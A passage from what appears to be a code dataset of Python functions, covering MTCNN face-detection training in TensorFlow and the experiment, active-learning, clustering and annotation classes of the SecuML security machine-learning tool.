        assert pos_batch_size != 0, 'Batch Size Error '
        part_batch_size = int(np.ceil(config.BATCH_SIZE * part_radio))
        assert part_batch_size != 0, 'Batch Size Error '
        neg_batch_size = int(np.ceil(config.BATCH_SIZE * neg_radio))
        assert neg_batch_size != 0, 'Batch Size Error '
        landmark_batch_size = int(np.ceil(config.BATCH_SIZE * landmark_radio))
        assert landmark_batch_size != 0, 'Batch Size Error '
        batch_sizes = [pos_batch_size, part_batch_size, neg_batch_size, landmark_batch_size]
        (image_batch, label_batch, bbox_batch, landmark_batch) = read_multi_tfrecords(dataset_dirs, batch_sizes, net)
    if net == 'PNet':
        image_size = 12
        radio_cls_loss = 1.0
        radio_bbox_loss = 0.5
        radio_landmark_loss = 0.5
    elif net == 'RNet':
        image_size = 24
        radio_cls_loss = 1.0
        radio_bbox_loss = 0.5
        radio_landmark_loss = 0.5
    else:
        radio_cls_loss = 1.0
        radio_bbox_loss = 0.5
        radio_landmark_loss = 1
        image_size = 48
    input_image = tf.placeholder(tf.float32, shape=[config.BATCH_SIZE, image_size, image_size, 3], name='input_image')
    label = tf.placeholder(tf.float32, shape=[config.BATCH_SIZE], name='label')
    bbox_target = tf.placeholder(tf.float32, shape=[config.BATCH_SIZE, 4], name='bbox_target')
    landmark_target = tf.placeholder(tf.float32, shape=[config.BATCH_SIZE, 10], name='landmark_target')
    input_image = image_color_distort(input_image)
    (cls_loss_op, bbox_loss_op, landmark_loss_op, L2_loss_op, accuracy_op) = net_factory(input_image, label, bbox_target, landmark_target, training=True)
    total_loss_op = radio_cls_loss * cls_loss_op + radio_bbox_loss * bbox_loss_op + radio_landmark_loss * landmark_loss_op + L2_loss_op
    (train_op, lr_op) = train_model(base_lr, total_loss_op, num)
    init = tf.global_variables_initializer()
    sess = tf.Session()
    saver = tf.train.Saver(max_to_keep=0)
    sess.run(init)
    tf.summary.scalar('cls_loss', cls_loss_op)
    tf.summary.scalar('bbox_loss', bbox_loss_op)
    tf.summary.scalar('landmark_loss', landmark_loss_op)
    tf.summary.scalar('cls_accuracy', accuracy_op)
    tf.summary.scalar('total_loss', total_loss_op)
    summary_op = tf.summary.merge_all()
    logs_dir = '../logs/%s' % net
    if os.path.exists(logs_dir) == False:
        os.mkdir(logs_dir)
    writer = tf.summary.FileWriter(logs_dir, sess.graph)
    projector_config = projector.ProjectorConfig()
    projector.visualize_embeddings(writer, projector_config)
    coord = tf.train.Coordinator()
    threads = tf.train.start_queue_runners(sess=sess, coord=coord)
    i = 0
    MAX_STEP = int(num / config.BATCH_SIZE + 1) * end_epoch
    epoch = 0
    sess.graph.finalize()
    try:
        for step in range(MAX_STEP):
            i = i + 1
            if coord.should_stop():
                break
            (image_batch_array, label_batch_array, bbox_batch_array, landmark_batch_array) = sess.run([image_batch, label_batch, bbox_batch, landmark_batch])
            (image_batch_array, landmark_batch_array) = random_flip_images(image_batch_array, label_batch_array, landmark_batch_array)
            ""\n            print('im here')\n            print(image_batch_array.shape)\n            print(label_batch_array.shape)\n            print(bbox_batch_array.shape)\n            print(landmark_batch_array.shape)\n            print(label_batch_array[0])\n            print(bbox_batch_array[0])\n            print(landmark_batch_array[0])\n            ""
            (_, _, summary) = sess.run([train_op, lr_op, summary_op], feed_dict={input_image: image_batch_array, label: label_batch_array, bbox_target: bbox_batch_array, landmark_target: landmark_batch_array})
            if (step + 1) % display == 0:
                (cls_loss, bbox_loss, landmark_loss, L2_loss, lr, acc) = sess.run([cls_loss_op, bbox_loss_op, landmark_loss_op, L2_loss_op, lr_op, accuracy_op], feed_dict={input_image: image_batch_array, label: label_batch_array, bbox_target: bbox_batch_array, landmark_target: landmark_batch_array})
                total_loss = radio_cls_loss * cls_loss + radio_bbox_loss * bbox_loss + radio_landmark_loss * landmark_loss + L2_loss
                print('%s : Step: %d/%d, accuracy: %3f, cls loss: %4f, bbox loss: %4f,Landmark loss :%4f,L2 loss: %4f, Total Loss: %4f ,lr:%f ' % (datetime.now(), step + 1, MAX_STEP, acc, cls_loss, bbox_loss, landmark_loss, L2_loss, total_loss, lr))
            if i * config.BATCH_SIZE > num * 2:
                epoch = epoch + 1
                i = 0
                path_prefix = saver.save(sess, prefix, global_step=epoch * 2)
                print('path prefix is :', path_prefix)
            writer.add_summary(summary, global_step=step)
    except tf.errors.OutOfRangeError:
        print('完成！！！')
    finally:
        coord.request_stop()
        writer.close()
    coord.join(threads)
    sess.close()"
AITTSMD/MTCNN-Tensorflow,train_ONet,"def train_ONet(base_dir, prefix, end_epoch, display, lr):
    """"""
    train PNet
    :param dataset_dir: tfrecord path
    :param prefix:
    :param end_epoch:
    :param display:
    :param lr:
    :return:
    """"""
    net_factory = O_Net
    train(net_factory, prefix, end_epoch, base_dir, display=display, base_lr=lr)"
AITTSMD/MTCNN-Tensorflow,train_PNet,"def train_PNet(base_dir, prefix, end_epoch, display, lr):
    """"""
    train PNet
    :param dataset_dir: tfrecord path
    :param prefix:
    :param end_epoch: max epoch for training
    :param display:
    :param lr: learning rate
    :return:
    """"""
    net_factory = P_Net
    train(net_factory, prefix, end_epoch, base_dir, display=display, base_lr=lr)"
AITTSMD/MTCNN-Tensorflow,train_RNet,"def train_RNet(base_dir, prefix, end_epoch, display, lr):
    """"""
    train PNet
    :param dataset_dir: tfrecord path
    :param prefix:
    :param end_epoch:
    :param display:
    :param lr:
    :return:
    """"""
    net_factory = R_Net
    train(net_factory, prefix, end_epoch, base_dir, display=display, base_lr=lr)"
ANSSI-FR/SecuML,gen_yml_conf,"def gen_yml_conf(db_type, dir_):
    if db_type == 'mysql':
        db_uri = 'mysql+mysqlconnector://travis@localhost/secuml'
    elif db_type == 'psql':
        db_uri = 'postgresql://localhost/secuml'
    else:
        raise ValueError('db_uri must be mysql or psql.')
    travis_conf = {'input_data_dir': path.join(dir_, 'input_data'), 'output_data_dir': path.join(dir_, 'output_data'), 'db_uri': db_uri, 'logger_level': 'ERROR'}
    with open(path.join('conf', 'travis_%s.yml' % db_type), 'w') as f:
        yaml.dump(travis_conf, f)"
ANSSI-FR/SecuML,register_submodules,"def register_submodules(module, factory):
    for (_, name, _) in pkgutil.iter_modules(module.__path__):
        class_name = '%sConf' % ''.join(map(lambda x: x.capitalize(), name.split('_')))
        submodule = importlib.import_module(module.__name__ + '.' + name)
        factory.register(class_name, getattr(submodule, class_name))"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger):
    self.logger = logger"
ANSSI-FR/SecuML,fields_to_export,"@abc.abstractmethod
def fields_to_export(self):
    return []"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    fields = self.fields_to_export()
    conf = {}
    conf['__type__'] = self.__class__.__name__
    for (f, f_type) in fields:
        f_value = getattr(self, f)
        if f_type == exportFieldMethod.primitive:
            conf[f] = f_value
        elif f_type == exportFieldMethod.obj:
            if f_value is not None:
                conf[f] = f_value.to_json()
            else:
                conf[f] = None
        elif f_type == exportFieldMethod.string:
            conf[f] = str(f_value)
        elif f_type == exportFieldMethod.obj_class:
            if f_value is not None:
                conf[f] = f_value.__name__
            else:
                conf[f] = None
        elif f_type == exportFieldMethod.enum_value:
            conf[f] = f_value.name
        else:
            print(f)
            assert False
    return conf"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self.methods = {}"
ANSSI-FR/SecuML,register,"def register(self, class_name, class_obj):
    self.methods[class_name] = class_obj"
ANSSI-FR/SecuML,from_json,"def from_json(self, obj, logger):
    return self.methods[obj['__type__']].from_json(obj, logger)"
ANSSI-FR/SecuML,from_args,"def from_args(self, method, args, logger):
    return self.get_class(method).from_args(args, logger)"
ANSSI-FR/SecuML,gen_parser,"def gen_parser(self, method, parser):
    return self.get_class(method).gen_parser(parser)"
ANSSI-FR/SecuML,get_class,"def get_class(self, method):
    return self.methods[method + 'Conf']"
ANSSI-FR/SecuML,get_methods,"def get_methods(self):
    return [k.split('Conf')[0] for k in self.methods.keys()]"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global experiment_factory
    if experiment_factory is None:
        experiment_factory = ExpFactory()
    return experiment_factory"
ANSSI-FR/SecuML,get_project_dataset,"def get_project_dataset(session, exp_id):
    query = session.query(ExpAlchemy)
    query = query.filter(ExpAlchemy.id == exp_id)
    try:
        exp = query.one()
    except NoResultFound:
        raise UndefinedExperiment(exp_id)
    dataset = exp.features_set.dataset
    return (dataset.project, dataset.dataset)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_id):
    self.exp_id = exp_id"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The experiment %i is not a main experiment. It cannot be deleted. ' % self.exp_id"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_id):
    self.exp_id = exp_id"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'There is no experiment with the id %i.' % self.exp_id"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp_conf, create=True, session=None):
    self.exp_conf = exp_conf
    self.logger = self.exp_conf.secuml_conf.logger
    self._set_session(session)
    self.exp_id = exp_conf.exp_id
    if create:
        self.create_exp()"
ANSSI-FR/SecuML,has_ground_truth,"def has_ground_truth(self):
    return self.exp_conf.dataset_conf.has_ground_truth"
ANSSI-FR/SecuML,_set_session,"def _set_session(self, session):
    if session is None:
        self.session = self.exp_conf.secuml_conf.Session()
    else:
        self.session = session"
ANSSI-FR/SecuML,output_dir,"def output_dir(self):
    return self.exp_conf.output_dir()"
ANSSI-FR/SecuML,get_instances,"def get_instances(self, instances=None):
    if instances is None:
        features_conf = self.exp_conf.features_conf
        instances = Instances(self, streaming=features_conf.streaming, stream_batch=features_conf.stream_batch)
    return instances"
ANSSI-FR/SecuML,run,"def run(self):
    if self.exp_conf.parent is None:
        self.logger.info('Experiment n°%d', self.exp_conf.exp_id)"
ANSSI-FR/SecuML,rollback_session,"def rollback_session(self):
    self.session.rollback()
    self.session.close()
    if self.exp_id is not None:
        self._remove_output_dir()"
ANSSI-FR/SecuML,_remove_output_dir,"def _remove_output_dir(self):
    output_dir = self.output_dir()
    if os.path.isdir(output_dir):
        shutil.rmtree(output_dir)"
ANSSI-FR/SecuML,close,"def close(self):
    self.close_session()
    print(display_in_green('\nExperiment %d has been successfully completed. \nSee http://%s:%d/SecuML/%d/ to display the results. \n' % (self.exp_id, self.exp_conf.secuml_conf.host, self.exp_conf.secuml_conf.port, self.exp_id)))"
ANSSI-FR/SecuML,close_session,"def close_session(self):
    self.session.commit()
    self.session.close()
    self.exp_conf.secuml_conf.close_log_handler()"
ANSSI-FR/SecuML,remove,"def remove(self, check_main=True):
    if check_main and self.exp_conf.parent is not None:
        raise NotMainExperiment(self.exp_conf.exp_id)
    query = self.session.query(ExpAlchemy)
    query = query.filter(ExpAlchemy.id == self.exp_id)
    exp_row = query.one()
    self._remove_children(exp_row)
    self.session.delete(exp_row)
    self._remove_output_dir()"
ANSSI-FR/SecuML,_remove_children,"def _remove_children(self, exp):
    children = [(c, c.child_id, len(c.child.parents)) for c in exp.children]
    for (child, child_id, num_parents) in children:
        self.session.delete(child)
        if num_parents > 1:
            continue
        self.session.commit()
        child_exp = get_factory().from_exp_id(child_id, self.exp_conf.secuml_conf, self.session)
        child_exp.remove(check_main=False)"
ANSSI-FR/SecuML,create_exp,"def create_exp(self):
    exp_dataset = Dataset(self.exp_conf, self.session)
    exp_dataset.load()
    self.session.commit()
    self.add_to_db()
    self.exp_conf.export()"
ANSSI-FR/SecuML,add_to_db,"def add_to_db(self):
    annotations_id = self.exp_conf.annotations_conf.annotations_id
    exp = ExpAlchemy(kind=self.exp_conf.get_kind(), name=self.exp_conf.name, features_set_id=self.exp_conf.features_conf.set_id, annotations_id=annotations_id)
    self.session.add(exp)
    self.session.flush()
    self.exp_conf.set_exp_id(exp.id)
    self.exp_id = exp.id
    if self.exp_conf.parent is not None:
        exp_relation = ExpRelationshipsAlchemy(child_id=self.exp_id, parent_id=self.exp_conf.parent)
        self.session.add(exp_relation)"
ANSSI-FR/SecuML,get_output_dir,"@staticmethod
def get_output_dir(secuml_conf, project, dataset, exp_id):
    return os.path.join(secuml_conf.output_data_dir, project, dataset, str(exp_id))"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self.classes = {}"
ANSSI-FR/SecuML,register,"def register(self, class_name, exp_class, conf_class):
    self.classes[class_name] = (exp_class, conf_class)"
ANSSI-FR/SecuML,from_exp_id,"def from_exp_id(self, exp_id, secuml_conf, session):
    (project, dataset) = get_project_dataset(session, exp_id)
    conf_filename = os.path.join(secuml_conf.output_data_dir, project, dataset, str(exp_id), 'conf.json')
    with open(conf_filename, 'r') as conf_file:
        conf_json = json.load(conf_file)
        class_name = conf_json['__type__'].split('Conf')[0]
        (exp_class, conf_class) = self.classes[class_name]
        exp_conf = conf_class.from_json(conf_json, secuml_conf)
        return exp_class(exp_conf, create=False, session=session)"
ANSSI-FR/SecuML,setApp,"def setApp(app_value):
    global app
    app = app_value"
ANSSI-FR/SecuML,setSession,"def setSession(session_value):
    global session
    session = session_value"
ANSSI-FR/SecuML,setSecuMlConf,"def setSecuMlConf(secuml_conf_value):
    global secuml_conf
    secuml_conf = secuml_conf_value"
ANSSI-FR/SecuML,setUserExp,"def setUserExp(user_exp_value):
    global user_exp
    user_exp = user_exp_value"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf, datasets):
    self.conf = conf
    self.datasets = datasets
    self.budget = self.conf.budget
    self.iter_num = 1
    self.current_budget = self.budget
    self.prev_iter = None
    self.curr_iter = None"
ANSSI-FR/SecuML,run_iterations,"def run_iterations(self, output_dir=None):
    while True:
        try:
            self.run_next_iter(output_dir)
        except (NoAnnotationAdded, NoUnlabeledDataLeft) as e:
            self.conf.logger.info(e)
            break"
ANSSI-FR/SecuML,run_next_iter,"def run_next_iter(self, output_dir=None):
    self.curr_iter = Iteration(self.conf, self.iter_num, datasets=self.datasets, prev_iter=self.prev_iter, budget=self.current_budget)
    self.current_budget = self.curr_iter.run()
    self.iter_num += 1
    self.curr_iter.prev_iter = None
    self.prev_iter = self.curr_iter"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances):
    self.instances = instances
    self.init_counts()"
ANSSI-FR/SecuML,update,"def update(self, instance_id, label, family):
    self.new_annotations = True
    self.instances.annotations.set_label_family(instance_id, label, family)
    self.num_annotations[label_bool_to_str(label)] += 1"
ANSSI-FR/SecuML,num_annotations,"def num_annotations(self, label='all'):
    return len(self.instances.annotations.get_annotated_ids(label=label))"
ANSSI-FR/SecuML,get_unlabeled_instances,"def get_unlabeled_instances(self):
    return self.instances.get_unlabeled_instances()"
ANSSI-FR/SecuML,has_unlabeled_data,"def has_unlabeled_data(self):
    return self.instances.has_unlabeled_data()"
ANSSI-FR/SecuML,init_counts,"def init_counts(self):
    self.ground_truth = {}
    self.num_init = {}
    self.num_annotations = {}
    for label in [MALICIOUS, BENIGN]:
        self.ground_truth[label] = None
        if self.instances.has_ground_truth():
            num = self.instances.num_instances(label=label, ground_truth=True)
            self.ground_truth[label] = num
        self.num_init[label] = self.instances.get_annotated_instances(label=label).num_instances()
        self.num_annotations[label] = self.num_init[label]"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The iteration has not added any annotation.'"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'There remains no unlabeled instances to be annotated.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf, iter_num, datasets=None, prev_iter=None, budget=None):
    self.prev_iter = prev_iter
    self.conf = conf
    self.datasets = datasets
    self.budget = budget
    self.iter_num = iter_num"
ANSSI-FR/SecuML,set_query_strategy,"def set_query_strategy(self):
    self.strategy = self.conf.get_strategy()(self)"
ANSSI-FR/SecuML,run,"def run(self):
    self.check_unlabeled_data()
    self.set_query_strategy()
    self.conf.logger.info('Start iteration n°%d' % self.iter_num)
    start = time.time()
    self.init_computations()
    self.update_model()
    self.generate_queries()
    self.answer_queries()
    self.global_execution_time = time.time() - start
    self.conf.logger.info('End iteration n°%d' % self.iter_num)
    self.conf.logger.info('Iteration n°%d: %f sec' % (self.iter_num, self.global_execution_time))
    return self.budget"
ANSSI-FR/SecuML,check_unlabeled_data,"def check_unlabeled_data(self):
    if not self.datasets.has_unlabeled_data():
        raise NoUnlabeledDataLeft()"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, predictions):
    self.strategy.generate_queries(predictions)"
ANSSI-FR/SecuML,init_computations,"def init_computations(self):
    if self.prev_iter is not None:
        self.prev_iter.final_computations()
    self.labels_monitoring = LabelsMonitoring(self)
    self.labels_monitoring.generate()
    self.suggestions_accuracy = SuggestionsAccuracy(self)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    if not self.conf.auto:
        try:
            self.update_annotated_instances()
        except NoAnnotationBudget as e:
            self.conf.logger.info(e)
            pass
    self.end_monitoring()
    self.check_new_annotations()"
ANSSI-FR/SecuML,end_monitoring,"def end_monitoring(self):
    self.suggestions_accuracy.generate()"
ANSSI-FR/SecuML,update_model,"def update_model(self):
    self.update_model = UpdateModel(self)
    self.update_model.execute()"
ANSSI-FR/SecuML,answer_queries,"def answer_queries(self):
    try:
        self.datasets.new_annotations = False
        self.strategy.annotate_auto()
    except NoAnnotationBudget as e:
        self.conf.logger.info(e)
        pass"
ANSSI-FR/SecuML,check_new_annotations,"def check_new_annotations(self):
    if not self.datasets.new_annotations:
        raise NoAnnotationAdded()"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration):
    self.iteration = iteration
    self.model_conf = self.iteration.conf.main_model_conf
    self.classifier = None"
ANSSI-FR/SecuML,execute,"def execute(self):
    assert False"
ANSSI-FR/SecuML,__init__,"def __init__(self, train_instances, test_instances):
    self.train_instances = train_instances
    self.test_instances = test_instances"
ANSSI-FR/SecuML,get_features_ids,"def get_features_ids(self):
    return self.train_instances.features.get_ids()"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self._datasets = []"
ANSSI-FR/SecuML,get_features_ids,"def get_features_ids(self):
    return self._datasets[0].get_features_ids()"
ANSSI-FR/SecuML,add_dataset,"def add_dataset(self, dataset):
    self._datasets.append(dataset)"
ANSSI-FR/SecuML,__init__,"def __init__(self):
    self.instances_ids = []
    self.distances = []
    self.label = None
    self.clusters_families_stats = {}
    self.num_annotated_instances = 0"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    return len(self.instances_ids)"
ANSSI-FR/SecuML,add_instance,"def add_instance(self, instance_id, distance, label, family, annotated):
    self.instances_ids.append(instance_id)
    self.distances.append(distance)
    label = labels_tools.label_bool_to_str(label)
    if family is not None:
        key = label + '__' + family
        if key not in self.clusters_families_stats:
            self.clusters_families_stats[key] = 0
        self.clusters_families_stats[key] += 1
    if annotated:
        self.num_annotated_instances += 1"
ANSSI-FR/SecuML,final_computation,"def final_computation(self, unknown_cluster_id):
    unknown_cluster_id = self.set_label(unknown_cluster_id)
    if self.num_instances() != 0:
        self.sort_instances()
    return unknown_cluster_id"
ANSSI-FR/SecuML,sort_instances,"def sort_instances(self):
    df = pd.DataFrame({'distance': self.distances}, index=list(map(str, self.instances_ids)))
    sort_data_frame(df, 'distance', True, True)
    self.instances_ids = list(map(int, df.index.values.tolist()))
    self.distances = df.distance.tolist()"
ANSSI-FR/SecuML,set_label,"def set_label(self, unknown_cluster_id):
    max_occurrences = 0
    for (key, v) in self.clusters_families_stats.items():
        if v > max_occurrences:
            max_occurrences = v
            self.label = key
    if self.label is None:
        self.label = 'unknown_' + str(unknown_cluster_id)
        return unknown_cluster_id + 1
    else:
        return unknown_cluster_id"
ANSSI-FR/SecuML,get_label,"def get_label(self):
    return self.label"
ANSSI-FR/SecuML,get_cluster_instances_visu,"def get_cluster_instances_visu(self, num_instances, rand=False, drop_instances=None):
    if drop_instances is None:
        drop_instances = []
    num_center = int(num_instances / 2)
    num_edge = num_instances - num_center
    c_e_r = {}
    c_e_r['c'] = self.get_instances('center', num_center, drop_instances=drop_instances)
    c_e_r['e'] = self.get_instances('anomalous', num_edge, drop_instances=drop_instances + c_e_r['c'])
    if rand:
        num_random = num_instances
        c_e_r['r'] = self.get_instances('random', num_random, drop_instances=drop_instances + c_e_r['c'] + c_e_r['e'])
    else:
        c_e_r['r'] = []
    return c_e_r"
ANSSI-FR/SecuML,to_json,"def to_json(self, drop_instances=None):
    obj = {}
    if drop_instances is None:
        obj['instances_ids'] = self.instances_ids
        obj['distances'] = self.distances
    else:
        obj['instances_ids'] = []
        obj['distances'] = []
        for i in range(len(self.instances_ids)):
            instance_id = self.instances_ids[i]
            if instance_id in drop_instances:
                continue
            else:
                obj['instances_ids'].append(instance_id)
                obj['distances'].append(self.distances[i])
    obj['label'] = self.label
    return obj"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj):
    cluster = Cluster()
    cluster.instances_ids = obj['instances_ids']
    cluster.distances = obj['distances']
    cluster.label = obj['label']
    return cluster"
ANSSI-FR/SecuML,get_instances,"def get_instances(self, c_e_r, num_instances, drop_instances=None):
    if c_e_r == 'all':
        return self.instances_ids
    if num_instances == 0:
        return []
    if drop_instances is None:
        instances = self.instances_ids
    else:
        instances = [x for x in self.instances_ids if x not in drop_instances]
    if len(instances) < num_instances:
        return instances
    if c_e_r == 'center':
        return instances[:num_instances]
    elif c_e_r == 'anomalous':
        return instances[-num_instances:]
    elif c_e_r == 'random':
        return random.sample(instances, num_instances)
    else:
        raise ValueError('Invalid argument value c_e_r %s' % c_e_r)"
ANSSI-FR/SecuML,__init__,"def __init__(self, instances, assigned_clusters, clustering_algo=None):
    self.instances = instances
    self.assigned_clusters = assigned_clusters
    if len(assigned_clusters) == 0:
        self.num_clusters = 0
    else:
        self.num_clusters = max(assigned_clusters) + 1
        self.with_outliers = False
        if -1 in set(assigned_clusters):
            self.num_clusters += 1
            self.with_outliers = True
    self.clustering_algo = clustering_algo
    self.evaluation = ClusteringEvaluation(self.instances, self.assigned_clusters, self.clustering_algo)"
ANSSI-FR/SecuML,num_clusters,"def num_clusters(self):
    return self.num_clusters"
ANSSI-FR/SecuML,init_clusters_list,"def init_clusters_list(self, num_clusters):
    self.clusters = [Cluster() for x in range(num_clusters)]"
ANSSI-FR/SecuML,generate,"def generate(self, centroids, drop_annotated_instances=False, cluster_labels=None):
    self.init_clusters_list(self.num_clusters)
    if cluster_labels is not None:
        for x in range(self.num_clusters):
            self.clusters[x].label = cluster_labels[x]
    ids = self.instances.ids.get_ids()
    for i in range(len(ids)):
        instance_id = ids[i]
        annotated = self.instances.annotations.is_annotated(instance_id)
        c = self.assigned_clusters[i]
        label = self.instances.annotations.get_label(instance_id)
        family = self.instances.annotations.get_family(instance_id)
        if centroids is not None:
            centroid = centroids[c].reshape(1, -1)
            features = self.instances.features.get_instance_features(instance_id).reshape(1, -1)
            distance = euclidean_distances(centroid, features)[0][0]
        else:
            distance = None
        self.clusters[c].add_instance(instance_id, distance, label, family, annotated)
    unknown_cluster_id = 0
    for c in range(self.num_clusters):
        unknown_cluster_id = self.clusters[c].final_computation(unknown_cluster_id)
    if self.with_outliers:
        self.clusters[-1].label = 'Outliers'"
ANSSI-FR/SecuML,gen_eval,"def gen_eval(self, output_dir, quick=False):
    self.evaluation.gen_eval(output_dir, quick=quick)
    obj = self.evaluation.to_json()
    filename = path.join(output_dir, 'clustering_evaluation.json')
    with open(filename, 'w') as f:
        json.dump(obj, f, indent=2)"
ANSSI-FR/SecuML,export,"def export(self, directory, drop_annotated_instances=False):
    obj = {}
    obj['assigned_clusters'] = list(map(int, self.assigned_clusters))
    if drop_annotated_instances:
        drop_instances = self.instances.get_annotated_ids()
    else:
        drop_instances = None
    for c in range(self.num_clusters):
        obj[str(c)] = self.clusters[c].to_json(drop_instances=drop_instances)
    filename = path.join(directory, 'clusters.json')
    with open(filename, 'w') as f:
        json.dump(obj, f, indent=2)"
ANSSI-FR/SecuML,get_label,"def get_label(self, selected_cluster):
    return self.clusters[selected_cluster].get_label()"
ANSSI-FR/SecuML,get_cluster_instances_visu,"def get_cluster_instances_visu(self, selected_cluster, num_instances, random=False, drop_instances=None):
    cluster = self.clusters[selected_cluster]
    return cluster.get_cluster_instances_visu(num_instances, random, drop_instances)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(directory):
    clustering = Clusters(None, [])
    with open(path.join(directory, 'clusters.json'), 'r') as f:
        obj = json.load(f)
        clustering.assigned_clusters = obj['assigned_clusters']
        clustering.num_clusters = len(obj) - 1
        clustering.clusters = [Cluster() for x in range(clustering.num_clusters)]
        for c in range(clustering.num_clusters):
            clustering.clusters[c] = Cluster.from_json(obj[str(c)])
    return clustering"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, labels, families, ids):
    self.ids = ids
    self._set_labels_families(labels, families)
    self.check_validity()"
ANSSI-FR/SecuML,check_validity,"def check_validity(self):
    num_instances = self.ids.num_instances()
    if self.labels.shape[0] != num_instances:
        raise InvalidAnnotations('There are %d instances but %d labels are provided.' % (num_instances, self.labels.shape[0]))
    elif self.families.shape[0] != num_instances:
        raise InvalidAnnotations('There are %d instances but %d families are provided.' % (num_instances, self.families.shape[0]))"
ANSSI-FR/SecuML,_set_labels_families,"def _set_labels_families(self, labels, families):
    self.set_labels(labels)
    self.set_families(families)"
ANSSI-FR/SecuML,union,"def union(self, annotations):
    self.labels = np.hstack((self.labels, annotations.labels))
    self.families = np.hstack((self.families, annotations.families))
    self.check_validity()"
ANSSI-FR/SecuML,get_from_ids,"def get_from_ids(self, ids):
    if ids.num_instances() == 0:
        return Annotations(None, None, ids)
    else:
        indexes = np.array([self.ids.get_index(i) for i in ids.ids])
        return Annotations(self.labels[indexes], self.families[indexes], ids)"
ANSSI-FR/SecuML,get_from_indices,"def get_from_indices(self, ids, indices):
    if ids.num_instances() == 0:
        return Annotations(None, None, ids)
    else:
        return Annotations(self.labels[indices], self.families[indices], ids)"
ANSSI-FR/SecuML,num_instances,"def num_instances(self, label='all'):
    if label == 'all':
        return self.ids.num_instances()
    else:
        mask = self.labels == label_str_to_bool(label)
        return np.sum(mask)"
ANSSI-FR/SecuML,get_supervision,"def get_supervision(self, multiclass):
    if multiclass:
        return self.get_families()
    else:
        return self.get_labels()"
ANSSI-FR/SecuML,get_labels,"def get_labels(self):
    return self.labels"
ANSSI-FR/SecuML,get_label,"def get_label(self, instance_id):
    return self.labels[self.ids.get_index(instance_id)]"
ANSSI-FR/SecuML,set_label,"def set_label(self, instance_id, label):
    self.labels[self.ids.get_index(instance_id)] = label"
ANSSI-FR/SecuML,set_labels,"def set_labels(self, labels):
    num_instances = self.ids.num_instances()
    if labels is None:
        labels = np.full((num_instances,), None)
    elif labels.shape[0] != num_instances:
        raise InvalidAnnotations('There are %d instances but there %d labels are provided.' % (num_instances, len(labels)))
    self.labels = labels"
ANSSI-FR/SecuML,get_families,"def get_families(self):
    return self.families"
ANSSI-FR/SecuML,get_family,"def get_family(self, instance_id):
    return self.families[self.ids.get_index(instance_id)]"
ANSSI-FR/SecuML,set_family,"def set_family(self, instance_id, family):
    self.families[self.ids.get_index(instance_id)] = family"
ANSSI-FR/SecuML,set_label_family,"def set_label_family(self, instance_id, label, family):
    index = self.ids.get_index(instance_id)
    self.labels[index] = label
    self.families[index] = family"
ANSSI-FR/SecuML,get_label_family,"def get_label_family(self, instance_id):
    index = self.ids.get_index(instance_id)
    return (self.labels[index], self.families[index])"
ANSSI-FR/SecuML,set_families,"def set_families(self, families):
    num_instances = self.ids.num_instances()
    if families is None:
        families = np.full((num_instances,), None)
    elif families.shape[0] != num_instances:
        raise InvalidAnnotations('There are %d instances but %d families are provided.' % (num_instances, len(families)))
    self.families = families"
ANSSI-FR/SecuML,get_family_ids,"def get_family_ids(self, family):
    return self.ids.ids[self.families == family]"
ANSSI-FR/SecuML,get_families_values,"def get_families_values(self, label='all'):
    families = self.families
    if label != 'all':
        families = self.families[self.labels == label_str_to_bool(label)]
    return set(families[families != None])"
ANSSI-FR/SecuML,get_families_count,"def get_families_count(self, label='all'):
    families_values = self.get_families_values(label=label)
    families_count = {}
    for family in families_values:
        families_count[family] = len(self.get_family_ids(family))
    return families_count"
ANSSI-FR/SecuML,get_families_prop,"def get_families_prop(self, label='all'):
    families_prop = self.get_families_count(label=label)
    for family in list(families_prop.keys()):
        families_prop[family] /= self.num_instances(label=label)
    return families_prop"
ANSSI-FR/SecuML,get_annotated_ids,"def get_annotated_ids(self, label='all', family=None):
    if label == 'all':
        mask = self.labels != None
    else:
        mask = self.labels == label_str_to_bool(label)
    if family is not None:
        family_mask = self.families == family
        mask = np.logical_and(mask, family_mask)
    return self.ids.ids[mask]"
ANSSI-FR/SecuML,get_unlabeled_ids,"def get_unlabeled_ids(self):
    return self.ids.ids[self.labels == None]"
ANSSI-FR/SecuML,has_unlabeled_ids,"def has_unlabeled_ids(self):
    for i in self.ids.get_ids():
        if not self.is_annotated(i):
            return True
    return False"
ANSSI-FR/SecuML,is_annotated,"def is_annotated(self, instance_id):
    return self.get_label(instance_id) is not None"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, message):
    self.message = message"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return self.message"
ANSSI-FR/SecuML,__init__,"def __init__(self, ids, names, descriptions, types):
    self.ids = ids
    self.names = names
    self.descriptions = descriptions
    self.types = types
    self._check_validity()"
ANSSI-FR/SecuML,num_features,"def num_features(self):
    return len(self.ids)"
ANSSI-FR/SecuML,union,"def union(self, info):
    self.ids.extend(info.ids)
    self.names.extend(info.names)
    self.descriptions.extend(info.descriptions)
    self.types.extend(info.types)
    self._check_validity()"
ANSSI-FR/SecuML,to_json,"def to_json(self):
